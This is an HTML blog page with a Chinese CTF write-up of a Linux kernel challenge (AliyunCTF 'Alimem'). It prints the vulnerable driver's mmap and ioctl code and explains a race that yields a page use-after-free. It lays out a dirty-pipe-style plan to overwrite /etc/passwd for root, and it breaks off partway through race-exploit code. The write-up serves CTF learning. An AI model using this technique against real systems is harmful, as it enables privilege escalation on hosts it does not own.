<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="a2ure&#39;s blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="a2ure&#39;s blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="a2ure">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>a2ure's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">a2ure's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/05/AliyunCTF-Alimem/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="a2ure">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="a2ure's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/03/05/AliyunCTF-Alimem/" class="post-title-link" itemprop="url">AliyunCTF--Alimem</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-03-05 19:30:27 / Modified: 19:55:15" itemprop="dateCreated datePublished" datetime="2025-03-05T19:30:27+08:00">2025-03-05</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/recurrence/" itemprop="url" rel="index"><span itemprop="name">recurrence</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>3.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="AliyunCTF–Alimem"><a href="#AliyunCTF–Alimem" class="headerlink" title="AliyunCTF–Alimem"></a>AliyunCTF–Alimem</h1><h2 id="一-背景介绍"><a href="#一-背景介绍" class="headerlink" title="一. 背景介绍"></a>一. 背景介绍</h2><p>​	本题主要是通过实现了一个misc设备来实现一个简单的内存管理模块，支持增删查改以及mmap的回调函数，通过对于本题的学习了解如何注册一个Misc设备并且通过vma_area_struct实现虚拟内存的实现，最终利用多线程竞争的漏洞，实现对于内核页的uaf，利用splice函数将只读的&#x2F;etc&#x2F;passwd覆盖，实现提权的思路。</p>
<h3 id="1-1-splice函数"><a href="#1-1-splice函数" class="headerlink" title="1.1 splice函数"></a>1.1 splice函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE         <span class="comment">/* See feature_test_macros(7) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">splice</span><span class="params">(<span class="type">int</span> fd_in, <span class="type">loff_t</span> *off_in, <span class="type">int</span> fd_out,</span></span><br><span class="line"><span class="params">               <span class="type">loff_t</span> *off_out, <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure>

<p>​	当我们想要将一个文件的数据拷贝到另一个文件时，比较朴素的一种想法是打开两个文件后将源文件数据读入后再写入目标文件，但这样的做法需要在用户空间与内核空间之间来回进行数据拷贝，具有可观的开销，因此为了减少这样的开销， splice这一个非常独特的系统调用应运而生，其作用是在文件与管道之间进行数据拷贝，以此将内核空间与用户空间之间的数据拷贝转变为内核空间内的数据拷贝，从而避免了数据在用户空间与内核空间之间的拷贝造成的开销。</p>
<p>​	因此如果我们存在一个UAF可以控制pipe_buffer结构体，可以清除flags字段的只读，就可以通过利用管道的读写，实现对于内核中只读的文件进行覆盖，这里的思路借鉴了CVE-2022-0847 dirty pipe的思想，利用这个办法可以避免传统覆盖pipe_buf_operations的方法，可以减少对于内核基地址的泄露，直接覆盖&#x2F;etc&#x2F;passwd实现提权思想。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-struct-page结构体"><a href="#1-2-struct-page结构体" class="headerlink" title="1.2 struct page结构体"></a>1.2 struct page结构体</h3><ul>
<li>virt_to_page() 返回与虚拟地址关联的页面</li>
<li>pfn_to_page() 返回与页面帧号关联的页面</li>
<li>page_to_pfn() 返回与 struct page 关联的页面帧号</li>
<li>page_address() 返回 struct page 的虚拟地址；此函数只能用于 lowmem 中的页面</li>
<li>kmap() 为任意物理页面（可以来自 highmem）在内核中创建映射，并返回虚拟地址，该虚拟地址可用于直接引用该页面</li>
</ul>
<h3 id="1-3-vm-area-struct结构体"><a href="#1-3-vm-area-struct结构体" class="headerlink" title="1.3 vm_area_struct结构体"></a>1.3 vm_area_struct结构体</h3><p>​	它表示的是一块连续的虚拟地址空间区域，给进程使用的，地址空间范围是0~3G，对应的物理页面都可以是不连续的。</p>
<p><img src="/./images/alimem/1741167424394.jpg" alt="1741167424394"></p>
<ul>
<li><p>vm_start 以及 vm_end ——内存区域的起始和结束地址（这些字段也出现在 &#x2F;proc&#x2F;<pid>&#x2F;maps 中）；</p>
</li>
<li><p>vm_file ——关联 file 结构的指针（如果有的话）；</p>
</li>
<li><p>vm_pgoff ——区域在文件中的偏移量；</p>
</li>
<li><p>vm_flags ——一组标志；</p>
</li>
<li><p>vm_ops ——该区域的工作函数集合；</p>
</li>
<li><p>vm_next 以及 vm_prev ——同一进程的区域通过链表结构连接起来。</p>
<p>对于驱动实现mmap回调函数来说，主要的作用就是讲设备的物理地址和要分配的虚拟地址进行映射，也就就是利用remap_pfn_range() 将连续的物理地址空间映射到由 vm_area_struct 表示的虚拟空间</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">remap_pfn_range</span><span class="params">(<span class="keyword">struct</span> vm_area_struct *vma, <span class="type">unsigned</span> <span class="type">long</span> addr,</span></span><br><span class="line"><span class="params">                    <span class="type">unsigned</span> <span class="type">long</span> pfn, <span class="type">unsigned</span> <span class="type">long</span> size, <span class="type">pgprot_t</span> prot)</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="二-漏洞产生原因"><a href="#二-漏洞产生原因" class="headerlink" title="二. 漏洞产生原因"></a>二. 漏洞产生原因</h2><h3 id="2-1-alimem-mmap函数"><a href="#2-1-alimem-mmap函数" class="headerlink" title="2.1 alimem_mmap函数"></a>2.1 alimem_mmap函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alimem_mmap</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx = vma-&gt;vm_pgoff;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alimem_page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">int</span> ret = -EINVAL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span> || idx &gt;= MAX_PAGES) <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (vma-&gt;vm_end - vma-&gt;vm_start != PAGE_SIZE) &#123;</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    rcu_read_lock();</span><br><span class="line">    <span class="keyword">if</span>(!pages[idx]) &#123;</span><br><span class="line">        rcu_read_unlock();</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    page = rcu_dereference(pages[idx]);</span><br><span class="line">    <span class="keyword">if</span> (page) &#123;</span><br><span class="line">        <span class="type">phys_addr_t</span> phys = page-&gt;phys;</span><br><span class="line">        vma-&gt;vm_ops = &amp;alimem_vm_ops;</span><br><span class="line">        vma-&gt;vm_private_data = page;</span><br><span class="line">        vm_flags_set(vma, vma-&gt;vm_flags | VM_DONTEXPAND | VM_DONTDUMP);</span><br><span class="line">        rcu_read_unlock();</span><br><span class="line">        <span class="keyword">if</span> (remap_pfn_range(vma, vma-&gt;vm_start, </span><br><span class="line">                          phys &gt;&gt; PAGE_SHIFT,</span><br><span class="line">                          vma-&gt;vm_end - vma-&gt;vm_start,</span><br><span class="line">                          vma-&gt;vm_page_prot)) &#123;</span><br><span class="line">            <span class="keyword">return</span> -EAGAIN;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">atomic_inc</span>(&amp;page-&gt;refcount);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    rcu_read_unlock();</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	该 alimem_mmap 函数是 Linux 设备驱动中实现内存映射的核心机制，其通过参数校验（检查用户指定的内存页索引是否合法及映射长度是否符合单页要求）、RCU 保护下的内存页查找（确保访问全局数组时的线程安全）、虚拟内存区域配置（设置自定义的 vm_ops 操作集并将 alimem_page 关联到 vm_private_data 以提供操作上下文）、物理内存映射（利用 remap_pfn_range 将内核物理页转换为用户虚拟地址）以及引用计数管理（通过原子操作确保内存页生命周期安全），构建了用户空间直接访问内核物理内存的通道。这种设计实现了<strong>零拷贝</strong>机制，用户程序可通过指针直接操作设备内存，避免了传统 read&#x2F;write 系统调用在用户态与内核态间的数据复制开销。</p>
<p>​	但是在设计中存在一个漏洞首先线通过rcu_dereference获得到了page的一个引用，之后在对其进行处理操作之后对于refcount进行增加。这就给到了多线程竞争的时间。</p>
<h3 id="2-2-ioctl函数"><a href="#2-2-ioctl函数" class="headerlink" title="2.2 ioctl函数"></a>2.2 ioctl函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">alimem_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx, ret = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alimem_page</span> *<span class="title">new_page</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> ALIMEM_ALLOC: &#123;</span><br><span class="line">        new_page = kzalloc(<span class="keyword">sizeof</span>(*new_page), GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!new_page) <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    </span><br><span class="line">        new_page-&gt;virt = (<span class="type">void</span> *)__get_free_pages(GFP_KERNEL, PAGE_ORDER);</span><br><span class="line">        <span class="keyword">if</span> (!new_page-&gt;virt) &#123;</span><br><span class="line">            kfree(new_page);</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        new_page-&gt;phys = virt_to_phys(new_page-&gt;virt);</span><br><span class="line">        <span class="type">atomic_set</span>(&amp;new_page-&gt;refcount, <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">        down_write(&amp;pages_lock);</span><br><span class="line">        <span class="keyword">for</span> (idx = <span class="number">0</span>; idx &lt; MAX_PAGES; idx++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!pages[idx]) &#123;</span><br><span class="line">                rcu_assign_pointer(pages[idx], new_page);</span><br><span class="line">                up_write(&amp;pages_lock);</span><br><span class="line">                <span class="keyword">return</span> idx;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        up_write(&amp;pages_lock);</span><br><span class="line">        free_pages((<span class="type">unsigned</span> <span class="type">long</span>)new_page-&gt;virt, PAGE_ORDER);</span><br><span class="line">        kfree(new_page);</span><br><span class="line">        <span class="keyword">return</span> -ENOSPC;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> ALIMEM_FREE: &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">alimem_page</span> *<span class="title">old</span>;</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (get_user(idx, (<span class="type">int</span> __user *)arg)) <span class="keyword">return</span> -EFAULT;</span><br><span class="line">        <span class="keyword">if</span> (idx &lt; <span class="number">0</span> || idx &gt;= MAX_PAGES) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    </span><br><span class="line">        down_write(&amp;pages_lock);</span><br><span class="line">        old = pages[idx];</span><br><span class="line">        <span class="keyword">if</span> (old) &#123;</span><br><span class="line">            rcu_assign_pointer(pages[idx], <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span> (atomic_dec_and_test(&amp;old-&gt;refcount)) &#123;</span><br><span class="line">                <span class="built_in">memset</span>(old-&gt;virt, <span class="number">0</span>, PAGE_SIZE);</span><br><span class="line">                call_rcu(&amp;old-&gt;rcu, free_page_rcu);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        up_write(&amp;pages_lock);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> ALIMEM_WRITE: &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">alimem_write</span> <span class="title">wr</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">alimem_page</span> *<span class="title">page</span>;</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(&amp;wr, (<span class="type">void</span> __user *)arg, <span class="keyword">sizeof</span>(wr)))</span><br><span class="line">            <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (wr.idx &lt; <span class="number">0</span> || wr.idx &gt;= MAX_PAGES || </span><br><span class="line">            wr.offset + wr.size &gt; PAGE_SIZE)</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    </span><br><span class="line">        rcu_read_lock();</span><br><span class="line">        page = rcu_dereference(pages[wr.idx]);</span><br><span class="line">        <span class="keyword">if</span> (!page) &#123;</span><br><span class="line">            rcu_read_unlock();</span><br><span class="line">            <span class="keyword">return</span> -EFAULT;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(page-&gt;virt + wr.offset, wr.data, wr.size)) &#123;</span><br><span class="line">            rcu_read_unlock();</span><br><span class="line">            <span class="keyword">return</span> -EFAULT;</span><br><span class="line">        &#125;</span><br><span class="line">        rcu_read_unlock();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> ALIMEM_READ: &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">alimem_read</span> <span class="title">rd</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">alimem_page</span> *<span class="title">page</span>;</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(&amp;rd, (<span class="type">void</span> __user *)arg, <span class="keyword">sizeof</span>(rd)))</span><br><span class="line">            <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (rd.idx &lt; <span class="number">0</span> || rd.idx &gt;= MAX_PAGES || </span><br><span class="line">            rd.offset + rd.size &gt; PAGE_SIZE)</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    </span><br><span class="line">        rcu_read_lock();</span><br><span class="line">        page = rcu_dereference(pages[rd.idx]);</span><br><span class="line">        <span class="keyword">if</span> (!page) &#123;</span><br><span class="line">            rcu_read_unlock();</span><br><span class="line">            <span class="keyword">return</span> -EFAULT;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (copy_to_user(rd.data, page-&gt;virt + rd.offset, rd.size)) &#123;</span><br><span class="line">            rcu_read_unlock();</span><br><span class="line">            <span class="keyword">return</span> -EFAULT;</span><br><span class="line">        &#125;</span><br><span class="line">        rcu_read_unlock();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> -ENOTTY;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	该 alimem_ioctl 函数通过处理 ALIMEM_ALLOC、ALIMEM_FREE、ALIMEM_WRITE 和 ALIMEM_READ 四个控制命令，实现了对内核物理内存页的动态分配、释放及用户态数据的读写操作：在分配时，通过 __get_free_pages 申请物理内存页并记录其虚拟与物理地址，利用自旋锁保护全局页表 pages 的更新，确保线程安全地插入空闲索引位；释放时通过原子引用计数和 RCU 机制延迟回收内存，避免并发访问冲突；读写操作则在验证索引与偏移合法性后，直接通过 copy_from_user 和 copy_to_user 在内核页与用户缓冲区之间传输数据，绕过传统文件读写的数据复制开销。整个过程通过 pages_lock 写锁与 RCU 读锁的协同，保障多线程环境下页表访问的原子性与一致性，同时借助引用计数和内存清零（memset）确保资源安全释放，最终实现用户态程序对设备内存的高效零拷贝访问。</p>
<p>​	但是漏洞主要发生的问题在于在free的时候由于没有加入rcu的读锁，导致我们可以在多线程竞争的情况下不断地free，如果在mmap获取引用和自增refcount之间的这段时间里面free掉了这个页面，那么我们就可以成功的mmap到之前free的一个页面，之后再利用pipe_buffer的分配就可以实现漏洞的利用了。</p>
<h2 id="三-漏洞利用"><a href="#三-漏洞利用" class="headerlink" title="三.漏洞利用"></a>三.漏洞利用</h2><h3 id="3-1-uaf构造"><a href="#3-1-uaf构造" class="headerlink" title="3.1 uaf构造"></a>3.1 uaf构造</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">check_zero</span><span class="params">(<span class="type">void</span> *addr)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *p = (<span class="type">char</span>*)addr;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PAGE_SIZE; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p[i] != <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">atomic_store</span>(&amp;uaf_detected, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">mapper_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">int</span> idx = *(<span class="type">int</span>*)arg;</span><br><span class="line">    addr = mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, idx * PAGE_SIZE);</span><br><span class="line">    usleep(<span class="number">500</span>);</span><br><span class="line">    <span class="keyword">if</span> (addr != MAP_FAILED) &#123;</span><br><span class="line">        usleep(<span class="number">50000</span>);</span><br><span class="line">        check_zero(addr);</span><br><span class="line">        <span class="keyword">if</span>(!uaf_detected)</span><br><span class="line">            munmap(addr, PAGE_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	首先讲一下check_zero函数和mapper_thread函数，这两个函数主要是对于上述所说的多线程竞争的主要实现，首先通过传入的id，来利用mmap函数分配虚拟设备中的内存，之后sleep一段时间，这段时间位于后面的usleep(50)多一些，使得后面可以不断的free，尝试再mmap获取到引用之后进行free。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">write_pattern</span><span class="params">(<span class="type">int</span> idx)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[PAGE_SIZE];</span><br><span class="line">    <span class="built_in">memset</span>(buf, PATTERN, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alimem_write</span> <span class="title">wr</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .offset = <span class="number">0</span>,</span><br><span class="line">        .data = buf,</span><br><span class="line">        .size = <span class="keyword">sizeof</span>(buf)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(fd, ALIMEM_WRITE, &amp;wr) &lt; <span class="number">0</span>) &#123;</span><br><span 